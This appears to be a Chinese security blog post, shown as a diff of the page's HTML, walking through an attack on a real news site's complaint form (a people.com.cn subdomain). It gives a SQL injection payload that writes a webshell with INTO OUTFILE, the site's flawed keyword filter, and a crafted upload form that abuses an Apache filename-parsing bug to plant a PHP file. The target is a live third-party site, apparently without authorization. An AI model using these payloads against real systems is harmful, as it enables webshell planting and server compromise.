<p>根据注入的思想，我们可以让insert这样执行：</p>  <p>&quot;insert into plaint(user,area,type,title,content,time)values(‘user_name’,’选项1,反正没检查,随便写’,’选项2,反正没检查,随便写’,’各种各种各种题目’,’各种各种各种各’,(select 0x3a into outfile &quot;/usr/ww/可写目录/webshell.php&quot;)’)+–+#’,’2012-04-20 13:18:51’)&quot;</p>  <p>因为insert into支持(字段,字段)values(‘值’,(SQL语句))的用法，而POST可以绕过gpc，这样尝试也许可以写入一句话。   <br>也许上各位看上面的SQL语句大概没明白，我们改改POST的html文件再看看明白不明白呢</p>  <p>&lt;textarea name=&quot;context&quot; cols=&quot;60&quot; rows=&quot;20&quot;&gt;各种各种各种…&lt;/textarea&gt;</p>  <p>&lt;textarea name=&quot;context&quot; cols=&quot;60&quot; rows=&quot;20&quot;&gt;各种各种各种…’,(select 0x3a into outfile &quot;/usr/ww/可写目录/webshell.php&quot;)’)+–+#&lt;/textarea&gt;</p>  <p>这不知道算不算POST注入中的一种呢   <br>不过重复POST数据，却并没有成功。问题出在哪里呢？再好好查查问题吧。    <br>应该出在inc.php，看代码：</p>  <p>&lt;?php</p>  <p>//要过滤的非法字符</p>  <p>$ArrFiltrate=array(&quot;’&quot;,&quot;script&quot;,&quot;&lt;&quot;,&quot;&gt;&quot;,&quot;union&quot;,&quot;select&quot;,&quot;update&quot;,&quot;and&quot;,&quot;create&quot;,&quot;drop&quot;,&quot;or&quot;,&quot;insert&quot;,&quot;load_file&quot;,&quot;0x&quot;,&quot;etc&quot;,&quot;www&quot;,&quot;Mr.&quot;,&quot;etc&quot;,&quot;passwd&quot;,&quot;print&quot;,&quot;<a href="http://&amp;quot" target="_blank" rel="external">http://&amp;quot</a>;);</p>  <p>$StrGoUrl=&quot;&quot;;</p>  <p>//是否存在数组中的值</p>  <p>function FunStringExist($StrFiltrate,$ArrFiltrate){</p>  <p>foreach ($ArrFiltrate as $key=&gt;$value){</p>  <p>if (eregi($value,$StrFiltrate)){</p>  <p>return true;</p>  <p>}</p>  <p>}</p>  <p>return false;</p>  <p>}</p>  <p>//合并$_POST 和 $_GET</p>  <p>if(function_exists(array_merge)){</p>  <p>$ArrPostAndGet=array_merge($HTTP_POST_VARS,$HTTP_GET_VARS);</p>  <p>}else{</p>  <p>foreach($HTTP_POST_VARS as $key=&gt;$value){</p>  <p>$ArrPostAndGet[]=$value;</p>  <p>}</p>  <p>foreach($HTTP_GET_VARS as $key=&gt;$value){</p>  <p>$ArrPostAndGet[]=$value;</p>  <p>}</p>  <p>}</p>  <p>看来还是有过滤检查的，这样的话insert into的注入就不能用了，或者说可能过滤以后有inc.php这个页面的注入都不能用了，虽然过滤的不太完善，不过也够费劲的了。   <br>上面是当上传文件为空的时候，系统执行的SQL语句，我们再来看看上传文件不为空的代码：</p>  <p>if(!$pic[‘name’]==&quot;&quot;){</p>  <p>$dest_dir=’upload’;</p>  <p>$dest=$dest<em>dir.’/‘.date(&quot;ydm&quot;).&quot;</em>&quot;.$user.&quot;.jpg&quot;;</p>  <p>//设置文件名为日期加上文件名避免重复</p>  <p>$r=move_uploaded_file($com_pic[‘tmp_name’],$dest);</p>  <p>$sql=&quot;insert into complaint(user,area,type,title,content,time,pic)values(‘&quot;.$user.&quot;’,’&quot;.$area.&quot;’,’&quot;.$type.&quot;’,’&quot;.$title.&quot;’,’&quot;.$context.&quot;’,’&quot;.date(&quot;Y-m-d H:i:s&quot;).&quot;’,’&quot;.$dest.&quot;’)&quot;;</p>  <p>$link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;<strong><em>*</em></strong>&quot;) or die(&quot;数据库异常&quot;);</p>  <p>$select=mysql_select_db(&quot;datab&quot;,$link);</p>  <p>@mysql_query($sql);</p>  <p>@mysql_close();</p>  <p>我们结合上面的代码</p>  <p>$user=$<em>POST[‘user’];</em></p>  <p>//对用户名取值，但是没做session验证</p>  <p>&lt;input type=&quot;hidden&quot; name=&quot;user&quot; id=&quot;user&quot; value=&quot;9476&quot;/&gt;</p>  <p>然后在看：   <br>$dest= ‘upload/‘.date(&quot;ydm&quot;).&quot;&quot;.$user.&quot;.jpg&quot;;    <br>只要上传的文件是.gif和.jpg和.png的后缀名，那么上传的文件就应该放在：    <br>upload/122004<em>9476.jpg    <br>其中upload/目录是固定的，122004是当前的日期，12是2012年，2004是04月20日，中间的下划线</em>是固定的，最后的.jpg也是固定的后缀名    <br>唯一可以变的就是$user这个变量。    <br>这套程序看似漏洞百出，其实也不太好突破。    <br>关于上传文件的命名方式，我们不妨参考一下：《<a href="http://bbs.blackbap.org/thread-2281-1-1.html" target="_blank" rel="external">PHPWEB网站管理系统后台Kedit编辑器漏洞利用代码</a>》</p>  <p>&lt;form action=&quot;<a href="http://*.people.com.cn/form.php&amp;quot" target="_blank" rel="external">http://*.people.com.cn/form.php&amp;quot</a>; method=&quot;post&quot; name=&quot;form&quot; enctype=&quot;multipart/form-data&quot;&gt;</p>  <p>&lt;input type=&quot;text&quot; name=&quot;area&quot; value=&quot;选项1,反正没检查,随便写&quot; /&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;text&quot; name=&quot;type&quot; value=&quot;选项2,反正没检查,随便写&quot; /&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;a.php;a.aaa&quot;/&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;file&quot; name=&quot;pic&quot; id=&quot;pic&quot; /&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;各种各种各种题目&quot;&gt;&lt;br /&gt;</p>  <p>&lt;textarea name=&quot;context&quot; cols=&quot;60&quot; rows=&quot;20&quot;&gt;各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种&lt;/textarea&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;</p>  <p>构造好了以后，就能POST上去一个文件了。根据对代码的分析，最终得到的文件应该就是：upload/122004_a.php;a.aaa.jpg了   <br>根据资料，Apache2中存在解析漏洞的版本为&lt;=2.2.11    <br>而人民网的此服务器Apache的版本是Apache 2.2.10 你懂的    <br>本来打算用一个终止符%00来终止后缀名.jpg，但是最终得到的却是把%00带进了真实的文件名，通过访问upload/122004_a.php%2500a.jpg证实    <br>后来才明白，%00这个通过POST提交以后似乎不能转换成真正的终止符\0???需要直接POST这个\0终止符才行    <br>此文章基于对隐私的保护，故将真实url隐去，未上传截图也是出于此目的。    <br>如果有人怀疑本文章所选例子的真实性，我只能说文章中的代码和实际代码确实不是一模一样，但是漏洞是一模一样的    <br>本文出自：Silic Group核心群 &amp; Silic Group项目开发群</p>
-    </section>
-    <footer class="post-footer">
-      <section class="author">
-    <h4>Secer</h4>
-    <p>记录互联网安全历程与个人成长经历</p>
-</section>
-      <section class="share">
-    <h4>Share this post</h4>
-    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/797.seo/" target="_blank">
-        <span class="hidden">weibo</span>
-    </a>
-    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/797.seo/"
-       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
-        <span class="hidden">Twitter</span>
-    </a>
-    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/797.seo/"
-       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
-        <span class="hidden">Facebook</span>
-    </a>
-    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/797.seo/"
-       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
-        <span class="hidden">Google+</span>
-    </a>
-</section>
-
-    </footer>
-  </article>
-  <nav class="pagination" role="pagination">
-    
-    <a class="newer-posts" href="/799.seo/">
-        ← 授权友情检测51cto
-    </a>
-    
-    <span class="icon-logo">•</span>
-    
-    <a class="older-posts" href="/794.seo/">
-        Metasploit利用CVE-2012-4681 java 0day入侵Windows →
-    </a>
-    
-</nav>
-
-  <div id="comment" class="comments-area">
-    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
-    
-</div>
-
-</main>
-
-
-      
-<footer class="site-footer">
   
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
-  </div>
-</footer>
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+    <span class="jiathis_txt">分享到：</span>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_weixin"></a>
+    <a class="jiathis_button_renren"></a>
+    <a href="http://www.jiathis.com/share?uid=1987046" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+    <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1987046" charset="utf-8"></script>
+<!-- JiaThis Button END -->
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
-
-
-
-  </div>
 </div>
 
-<nav  class="outer-nav top horizontal">
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/category/渗透测试/">渗透测试</a>
+</div>
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+  <div class="article-tags">
+  
+  <span></span> <a href="/tag/漏洞/">漏洞</a><a href="/tag/注入/">注入</a>
+  </div>
 
-          <a class="icon-image"  href="/images"><span>Images</span></a>
 
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/799.seo/" title="授权友情检测51cto">
+  <strong>Prev:</strong><br/>
+  <span>
+  授权友情检测51cto</span>
+</a>
+</div>
 
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
 
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+<div class="next">
+<a href="/794.seo/"  title="Metasploit利用CVE-2012-4681 java 0day入侵Windows">
+ <strong>Next:</strong><br/> 
+ <span>Metasploit利用CVE-2012-4681 java 0day入侵Windows
+</span>
+</a>
+</div>
 
 </nav>
 
+	<!-- 多说-->
+
+<section class="comment">
+<div class="ds-thread" data-thread-key="post-从分析代码学习挖掘漏洞人民网实例" data-title="从分析代码学习挖掘漏洞人民网实例" data-url="http://ha.cker.in/797.seo/"></div>
+</section>
+<!-- disqus-->
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  <p class="asidetitle">关注</p>
+<iframe width="100%" height="120" class="share_self" marginheight="5px" frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=120&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=2583230784&verifier=1d07a1a0&dpc=1"></iframe>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/category/Linux笔记/" title="Linux笔记">Linux笔记<sup>46</sup></a></li>
+		
+			<li><a href="/category/Web安全/" title="Web安全">Web安全<sup>88</sup></a></li>
+		
+			<li><a href="/category/代码学习/" title="代码学习">代码学习<sup>25</sup></a></li>
+		
+			<li><a href="/category/原创文章/" title="原创文章">原创文章<sup>37</sup></a></li>
+		
+			<li><a href="/category/工具视频/" title="工具视频">工具视频<sup>12</sup></a></li>
+		
+			<li><a href="/category/影音娱乐/" title="影音娱乐">影音娱乐<sup>15</sup></a></li>
+		
+			<li><a href="/category/手机安全/" title="手机安全">手机安全<sup>11</sup></a></li>
+		
+			<li><a href="/category/无线安全/" title="无线安全">无线安全<sup>4</sup></a></li>
+		
+			<li><a href="/category/渗透测试/" title="渗透测试">渗透测试<sup>94</sup></a></li>
+		
+			<li><a href="/category/疑难杂症/" title="疑难杂症">疑难杂症<sup>11</sup></a></li>
+		
+			<li><a href="/category/精品软件/" title="精品软件">精品软件<sup>16</sup></a></li>
+		
+			<li><a href="/category/絮叨碎语/" title="絮叨碎语">絮叨碎语<sup>47</sup></a></li>
+		
+			<li><a href="/category/黑客技巧/" title="黑客技巧">黑客技巧<sup>77</sup></a></li>
+		
+		</ul>
 </div>
-</body>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tag/net/" title=".net">.net<sup>1</sup></a></li>
+		
+			<li><a href="/tag/0day/" title="0day">0day<sup>5</sup></a></li>
+		
+			<li><a href="/tag/12306/" title="12306">12306<sup>3</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂/" title="12306刷票外挂">12306刷票外挂<sup>1</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂下载/" title="12306刷票外挂下载">12306刷票外挂下载<sup>1</sup></a></li>
+		
+			<li><a href="/tag/1521/" title="1521">1521<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3389/" title="3389">3389<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360/" title="360">360<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3600safe/" title="3600safe">3600safe<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360浏览器抢票专版/" title="360浏览器抢票专版">360浏览器抢票专版<sup>1</sup></a></li>
+		
+			<li><a href="/tag/61398/" title="61398">61398<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ACL/" title="ACL">ACL<sup>1</sup></a></li>
+		
+			<li><a href="/tag/APT/" title="APT">APT<sup>3</sup></a></li>
+		
+			<li><a href="/tag/ARP/" title="ARP">ARP<sup>2</sup></a></li>
+		
+			<li><a href="/tag/ASP/" title="ASP">ASP<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ASP中FSO的神奇功能/" title="ASP中FSO的神奇功能">ASP中FSO的神奇功能<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ATM/" title="ATM">ATM<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript中shellcode的定位和提取/" title="ActionScript中shellcode的定位和提取">ActionScript中shellcode的定位和提取<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript的反汇编和反编译/" title="ActionScript的反汇编和反编译">ActionScript的反汇编和反编译<sup>1</sup></a></li>
+		
+			<li><a href="/tag/Acunetix-Web-Vulnerability-Scanner/" title="Acunetix Web Vulnerability Scanner">Acunetix Web Vulnerability Scanner<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+      <li><a href="http://blog.csdn.net/dreajay" target="_blank" title="dreajay csdn">CSDN</a></li>
+      <li><a href="https://github.com/dreajay" target="_blank" title="dreajay github">github</a></li>
+      <li><a href="http://www.douban.com/people/72514701/" target="_blank" title="dreajay豆瓣">豆瓣</a></li>
+    </ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"dreajaygithubblog"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+</div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
+
+
+  </body>
 </html>
+
